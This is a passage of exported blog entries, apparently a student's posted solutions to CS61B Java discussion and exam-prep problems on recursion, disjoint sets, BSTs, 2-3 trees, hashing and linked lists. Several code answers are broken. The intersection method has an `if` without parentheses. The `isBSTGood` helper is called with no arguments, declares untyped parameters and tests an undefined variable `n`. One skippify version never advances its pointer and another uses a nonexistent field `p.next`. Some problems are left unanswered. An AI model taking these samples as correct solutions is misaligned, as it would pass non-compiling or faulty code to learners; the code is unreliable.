<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] intersection(<span class="keyword">int</span>[] A, <span class="keyword">int</span>[] B) &#123;</span><br><span class="line">    HashSet&lt;Integer&gt; setOfA = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    HashSet&lt;Integer&gt; resSet = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : A) &#123;</span><br><span class="line">        setOfA.add(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : B) &#123;</span><br><span class="line">        <span class="keyword">if</span> setOfA.contains(num) &#123;</span><br><span class="line">            resSet.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span>[] intersectionArray = <span class="keyword">new</span> <span class="keyword">int</span>[resSet.size()];</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : resSet) &#123;</span><br><span class="line">        intersectionArray[index] = num;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> intersectionArray;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-disc08</title>
    <url>/2018/10/31/cs61b-disc08/</url>
    <content><![CDATA[<h1 id="Intuition"><a href="#Intuition" class="headerlink" title="Intuition"></a>Intuition</h1><p>For the following recursive functions, give the worst case and best case running time in the appropriate O(·), Ω(·), or Θ(·) notation.<br>1.1 Give the running time in terms of N.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">andslam</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (N &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">1</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">"datboi.jpg"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        andslam(N / <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">The worst case and best case is all $\Theta(n)$</span></p>
<p>1.2 Give the running time for <code>andwelcome(arr, 0, N)</code> where N is the length of the input array arr.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">andwelcome</span><span class="params">(<span class="keyword">int</span>[] arr, <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span> </span>&#123;</span><br><span class="line">    System.out.print(<span class="string">"[ "</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = low; i &lt; high; i += <span class="number">1</span>) &#123;</span><br><span class="line">        System.out.print(<span class="string">"loyal "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">"]"</span>);</span><br><span class="line">    <span class="keyword">if</span> (high - low &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">double</span> coin = Math.random();</span><br><span class="line">        <span class="keyword">if</span> (coin &gt; <span class="number">0.5</span>) &#123;</span><br><span class="line">            andwelcome(arr, low, low + (high - low) / <span class="number">2</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            andwelcome(arr, low, low + (high - low) / <span class="number">2</span>);</span><br><span class="line">            andwelcome(arr, low + (high - low) / <span class="number">2</span>, high);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>1.3 Give the running time in terms of N.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">tothe</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line"><span class="number">2</span> <span class="keyword">if</span> (N &lt;= <span class="number">1</span>) &#123;</span><br><span class="line"><span class="number">3</span> <span class="keyword">return</span> N;</span><br><span class="line"><span class="number">4</span> &#125;</span><br><span class="line"><span class="number">5</span> <span class="keyword">return</span> tothe(N - <span class="number">1</span>) + tothe(N - <span class="number">1</span>);</span><br><span class="line"><span class="number">6</span> &#125;</span><br></pre></td></tr></table></figure>
<p>1.4 Give the running time in terms of N.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">spacejam</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line"><span class="number">2</span> <span class="keyword">if</span> (N &lt;= <span class="number">1</span>) &#123;</span><br><span class="line"><span class="number">3</span> <span class="keyword">return</span>;</span><br><span class="line"><span class="number">4</span> &#125;</span><br><span class="line"><span class="number">5</span> <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i += <span class="number">1</span>) &#123;</span><br><span class="line"><span class="number">6</span> spacejam(N - <span class="number">1</span>);</span><br><span class="line"><span class="number">7</span> &#125;</span><br><span class="line"><span class="number">8</span> &#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-disc09</title>
    <url>/2018/11/01/cs61b-disc09/</url>
    <content><![CDATA[<h1 id="1-WQU-and-Path-Compression"><a href="#1-WQU-and-Path-Compression" class="headerlink" title="1 WQU and Path Compression"></a>1 WQU and Path Compression</h1><p>Assume we have eight sets, represented by integers 1 through 8, that start off a completely disjoint sets. Draw the WQU Tree after the series of union() and find()<br>operations with path compression. Write down the result of find() operations. Break ties by choosing the smaller integer to be the root.</p>
<a id="more"></a>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">union(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">union(<span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">union(<span class="number">5</span>, <span class="number">7</span>);</span><br><span class="line">union(<span class="number">8</span>, <span class="number">4</span>);</span><br><span class="line">union(<span class="number">7</span>, <span class="number">2</span>);</span><br><span class="line">find(<span class="number">3</span>);</span><br><span class="line">union(<span class="number">6</span>, <span class="number">4</span>);</span><br><span class="line">union(<span class="number">6</span>, <span class="number">3</span>);</span><br><span class="line">find(<span class="number">7</span>);</span><br><span class="line">find(<span class="number">8</span>);</span><br></pre></td></tr></table></figure>
<p><span style="color:red">find() returns 2,1,1 respectively</span></p>


<h1 id="2-Is-This-a-BST"><a href="#2-Is-This-a-BST" class="headerlink" title="2 Is This a BST?"></a>2 Is This a BST?</h1><p>The following method <code>isBSTBad</code> is supposed check if a given binary tree is a BST, though for some binary trees, it is returning the wrong answer. Think about an example of a binary tree for which <code>isBSTBad</code> fails. Then, write <code>isBSTGood</code> so that it returns the correct answer for any binary tree. The <code>TreeNode</code> class is defined as follows:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    TreeNode left;</span><br><span class="line">    TreeNode right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Hint: You will find <code>Integer.MIN_VALUE</code> and <code>Integer.MAX_VALUE</code> helpful when writing <code>isBSTGood</code>.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isBSTBad</span><span class="params">(TreeNode T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (T == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (T.left != <span class="keyword">null</span> &amp;&amp; T.left.val &gt; T.val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (T.right != <span class="keyword">null</span> &amp;&amp; T.right.val &lt; T.val) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isBSTBad(T.left) &amp;&amp; isBSTBad(T.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isBSTGood</span><span class="params">(TreeNode T)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> isBSTHelper( );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isBSTHelper</span><span class="params">(TreeNode T, min, max)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (T.val &lt; min || T.val &gt; max) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isBSTHelper(T.left, min, T.val) &amp;&amp; isBSTHelper(T.right, T.val, max);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="3-2-3-Trees-and-LLRB’s"><a href="#3-2-3-Trees-and-LLRB’s" class="headerlink" title="3 2-3 Trees and LLRB’s"></a>3 2-3 Trees and LLRB’s</h1><p>3.1 Draw what the following 2-3 tree would look like after inserting 18, 38, 12, and 13.</p>




<p>3.2 Now, convert the resulting 2-3 tree to a left-leaning red-black tree.</p>


<p>3.3 Extra: If a 2-3 tree has depth H (that is, the leaves are at distance H from the root),<br>what is the maximum number of comparisons done in the corresponding red-black tree to find whether a certain key is present in the tree?</p>
<p><span style="color:red">2h comparisons. The maximum number of comparisons occur from a root to leaf path with the most nodes. Because the height of the tree is h, we know that there is a path down the leaf-leaning red-black tree that consists of at most h black links, for black links in the left-leaning red-black tree are the links that add to the height of the corresponding 2-3 tree. In the worst case, in the 2-3 tree representation, this path can consist entirely of nodes with two items, meaning in the left-leaning redblack tree representation, each blank link is followed by a red link. This doubles the amount of nodes on this path from the root to the leaf. This example will represent our longest path, which is 2h nodes long, meaning we make at most 2h comparisons in the left-leaning red-black tree</p>
<h1 id="4-Hashing"><a href="#4-Hashing" class="headerlink" title="4 Hashing"></a>4 Hashing</h1><p>4.1 Here are three potential implementations of the Integer’s hashCode() function. Categorize each as either a valid or an invalid hash function. If it is invalid, explain why. If it is valid, point out a flaw or disadvantage.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">Valid. As required, this hash function returns the same hashCode for Integers that<br>are equals() to each other. However, this is a terrible hash code because collisions are extremely frequent (collisions occur 100% of the time).</span></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> intValue() * intValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">Valid. Similar to (a), this hash function returns the same hashCode for integers that are equals(). However, integers that share the same absolute values will collide (for example, x = 5 and x = −5 will have the same hash code). A better hash function would be to just return the intValue() itself. </span></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.hashCode()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><span style="color:red">Invalid. This is not a valid hash function because integers that are equals() to each<br>other will not have the same hash code. Instead, this hash function returns some integer corresponding to the integer object’s location in memory.<br></span></p>
<p>4.2 Extra, but highly recommended: For each of the following questions, answer Always, Sometimes, or Never.<br>(a) When you modify a key that has been inserted into a HashMap will you be able to retrieve that entry again? Explain.<br><span style="color:red">Sometimes. If the hashCode for the key happens to change as a result of the modification, then we won’t be able to reliably retrieve the key.</span></p>
<p>(b) When you modify a value that has been inserted into a HashMap will you be able to retrieve that entry again? Explain.<br><span style="color:red">Always. The bucket index for an entry in a HashMap is decided by the key, not the value. Mutating the value does not affect the lookup procedure.</span></p>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-examprep03</title>
    <url>/2018/09/04/cs61b-examprep03/</url>
    <content><![CDATA[<h1 id="1-Flatten"><a href="#1-Flatten" class="headerlink" title="1 Flatten"></a>1 Flatten</h1><p>Write a method flatten that takes in a 2D array x and returns a 1D array that<br>contains all of the arrays in x concatenated together.<br>(Summer 2016 MT1)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] flatten(<span class="keyword">int</span>[][] x) &#123;</span><br><span class="line">    <span class="keyword">int</span> totalLength = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span>[] arr:x) &#123;</span><br><span class="line">        totalLength += arr.length;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span>[] a = <span class="keyword">new</span> <span class="keyword">int</span>[totalLength];</span><br><span class="line">    <span class="keyword">int</span> aIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span>[] arr:x) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">            a[aIndex] = arr[i];</span><br><span class="line">            aIndex++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line">flatten(&#123;&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;, &#123;&#125;, &#123;<span class="number">7</span>, <span class="number">8</span>&#125;&#125;) <span class="comment">// &#123;1,2,3,7,8&#125;</span></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="2-Skippify"><a href="#2-Skippify" class="headerlink" title="2 Skippify"></a>2 Skippify</h1><p>Suppose we have the following IntList class, as defined in lecture and lab, with an<br>added skippify function.<br>Suppose that we define two IntLists as follows.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">IntList A = IntList.list(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>);</span><br><span class="line">IntList B = IntList.list(<span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>Fill in the method skippify such that the result of calling skippify on A and B<br>are as below:</p>
<ul>
<li>After calling A.skippify(), A: (1, 3, 6, 10)</li>
<li>After calling B.skippify(), B: (9, 7, 4)<br>(Spring ’17, MT1)<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IntList</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">int</span> first;</span><br><span class="line"><span class="keyword">public</span> IntList rest;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123; ... &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntList <span class="title">list</span><span class="params">(<span class="keyword">int</span>... args)</span> </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">skippify</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    IntList p = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="keyword">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">        IntList next = p.rest;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            next = next.rest;</span><br><span class="line">            <span class="keyword">if</span> (next == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        p.rest = next;</span><br><span class="line">        n++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IntList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> first;</span><br><span class="line">    <span class="keyword">public</span> IntList rest;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123; ... &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> IntList <span class="title">list</span><span class="params">(<span class="keyword">int</span>... args)</span> </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">skippify</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        IntList p = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">int</span> n = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="keyword">null</span>) &#123;</span><br><span class="line">            IntList next = p.next;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (next == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                next = next.rest;</span><br><span class="line">            &#125;</span><br><span class="line">            p.rest = next;</span><br><span class="line">            p = p.rest;</span><br><span class="line">            n++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="3-Remove-Duplicates"><a href="#3-Remove-Duplicates" class="headerlink" title="3 Remove Duplicates"></a>3 Remove Duplicates</h1>Fill in the blanks below to correctly implement removeDuplicates.<br>(Spring ’17, MT1)<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// My solution</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IntList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> first;</span><br><span class="line">    <span class="keyword">public</span> IntList rest;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">IntList</span> <span class="params">(<span class="keyword">int</span> f, IntList r)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.first = f;</span><br><span class="line">        <span class="keyword">this</span>.rest = r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Given a sorted linked list of items - remove duplicates.</span></span><br><span class="line"><span class="comment">    * For example given 1 -&gt; 2 -&gt; 2 -&gt; 2 -&gt; 3,</span></span><br><span class="line"><span class="comment">    * Mutate it to become 1 -&gt; 2 -&gt; 3 (destructively)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">removeDuplicates</span><span class="params">(IntList p)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (p == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        IntList current = p.rest;</span><br><span class="line"></span><br><span class="line">        IntList previous = p;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (current != <span class="keyword">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (current.first == previous.first) &#123;</span><br><span class="line">                current = current.rest;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                previous.rest = current;</span><br><span class="line">                IntList next = current.rest;</span><br><span class="line">                previous = current;</span><br><span class="line">                current = next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PDF solution</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">removeDuplicates</span><span class="params">(IntList p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    IntList current = p.rest;</span><br><span class="line">    IntList previous = p;</span><br><span class="line">    <span class="keyword">while</span> (current != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current.first == previous.first) &#123;</span><br><span class="line">            previous.rest = current.rest;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        previous = current;</span><br><span class="line">    &#125;</span><br><span class="line">        current = current.rest;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>CS61B</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61b-examprep04</title>
    <url>/2018/09/05/cs61b-examprep04/</url>
    <content><![CDATA[<h1 id="1-Playing-with-Puppers"><a href="#1-Playing-with-Puppers" class="headerlink" title="1 Playing with Puppers"></a>1 Playing with Puppers</h1><p>Suppose we have the Dog and Corgi classes which are a defined below with a few<br>methods but no implementation shown. (modified from Spring ’16, MT1)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line"><span class="number">2</span>       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bark</span><span class="params">(Dog d)</span> </span>&#123; <span class="comment">/* Method A */</span> &#125;</span><br><span class="line"><span class="number">3</span> &#125;</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Corgi</span> <span class="keyword">extends</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line"><span class="number">6</span>       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bark</span><span class="params">(Corgi c)</span> </span>&#123; <span class="comment">/* Method B */</span> &#125;</span><br><span class="line"><span class="number">7</span>       <span class="meta">@Override</span></span><br><span class="line"><span class="number">8</span>       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">bark</span><span class="params">(Dog d)</span> </span>&#123; <span class="comment">/* Method C */</span> &#125;</span><br><span class="line"><span class="number">9</span>       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">play</span><span class="params">(Dog d)</span> </span>&#123; <span class="comment">/* Method D */</span> &#125;</span><br><span class="line"><span class="number">10</span>      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">play</span><span class="params">(Corgi c)</span> </span>&#123; <span class="comment">/* Method E */</span> &#125;</span><br><span class="line"><span class="number">11</span> &#125;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>For the following main method, at each call to play or bark, tell us what happens at<br>runtime by selecting which method is run or if there is a compiler error or runtime<br>error.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="number">2</span>       Dog d = <span class="keyword">new</span> Corgi();</span><br><span class="line"><span class="number">3</span>       Corgi c = <span class="keyword">new</span> Corgi();</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">5</span>       d.play(d); Compile-Error Runtime-Error A B C D E <span class="comment">// Compile-Error</span></span><br><span class="line"><span class="number">6</span>       d.play(c); Compile-Error Runtime-Error A B C D E <span class="comment">// Compile-Error</span></span><br><span class="line"><span class="number">7</span>       c.play(d); Compile-Error Runtime-Error A B C D E <span class="comment">// D</span></span><br><span class="line"><span class="number">8</span>       c.play(c); Compile-Error Runtime-Error A B C D E <span class="comment">// E</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">10</span>      c.bark(d); Compile-Error Runtime-Error A B C D E <span class="comment">// C</span></span><br><span class="line"><span class="number">11</span>      c.bark(c); Compile-Error Runtime-Error A B C D E <span class="comment">// B</span></span><br><span class="line"><span class="number">12</span>      d.bark(d); Compile-Error Runtime-Error A B C D E <span class="comment">// C</span></span><br><span class="line"><span class="number">13</span>      d.bark(c); Compile-Error Runtime-Error A B C D E <span class="comment">// C</span></span><br><span class="line"><span class="number">14</span> &#125;</span><br></pre></td></tr></table></figure>
<h1 id="2-Cast-the-Line"><a href="#2-Cast-the-Line" class="headerlink" title="2 Cast the Line"></a>2 Cast the Line</h1><p>Suppose Cat and Dog are two subclasses of the Animal class and the Tree class is<br>unrelated to the Animal hierarchy. All four classes have default constructors. For<br>each line below, determine whether it causes a compilation error, runtime error, or<br>runs successfully. Consider each line independently of all other lines. (extended<br>from Summer ’17, MT1)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="number">2</span>       Cat c = <span class="keyword">new</span> Animal(); <span class="comment">// compilation error</span></span><br><span class="line"><span class="number">3</span>       Animal a = <span class="keyword">new</span> Cat(); <span class="comment">// run successfully</span></span><br><span class="line"><span class="number">4</span>       Dog d = <span class="keyword">new</span> Cat(); <span class="comment">// compilation error</span></span><br><span class="line"><span class="number">5</span>       Tree t = <span class="keyword">new</span> Animal(); <span class="comment">// compilation error</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span>       Animal a = (Cat) <span class="keyword">new</span> Cat(); <span class="comment">// run successfully</span></span><br><span class="line"><span class="number">8</span>       Animal a = (Animal) <span class="keyword">new</span> Cat(); <span class="comment">// run successfully</span></span><br><span class="line"><span class="number">9</span>       Dog d = (Dog) <span class="keyword">new</span> Animal(); <span class="comment">// runtime error</span></span><br><span class="line"><span class="number">10</span>      Cat c = (Cat) <span class="keyword">new</span> Dog(); <span class="comment">// compilation error</span></span><br><span class="line"><span class="number">11</span>      Animal a = (Animal) <span class="keyword">new</span> Tree(); <span class="comment">// compilation error</span></span><br><span class="line"><span class="number">12</span> &#125;</span><br></pre></td></tr></table></figure>
<h1 id="3-SLList-Vista"><a href="#3-SLList-Vista" class="headerlink" title="3 SLList Vista"></a>3 SLList Vista</h1><p>(Slightly adapted from Summer 2017 MT1) Consider the SLList class, which represents<br>a singly-linked list. A heavily abridged version of this class appears below:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SLList</span> </span>&#123;</span><br><span class="line"><span class="number">2</span> ...</span><br><span class="line"><span class="number">3</span>       <span class="function"><span class="keyword">public</span> <span class="title">SLList</span><span class="params">()</span> </span>&#123; ... &#125;</span><br><span class="line"><span class="number">4</span>       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insertFront</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; ... &#125;</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">6</span>       <span class="comment">/* Returns the index of x in the list, if it exists.</span></span><br><span class="line"><span class="comment">7       Otherwise, returns -1 */</span></span><br><span class="line"><span class="number">8</span>       <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(<span class="keyword">int</span> 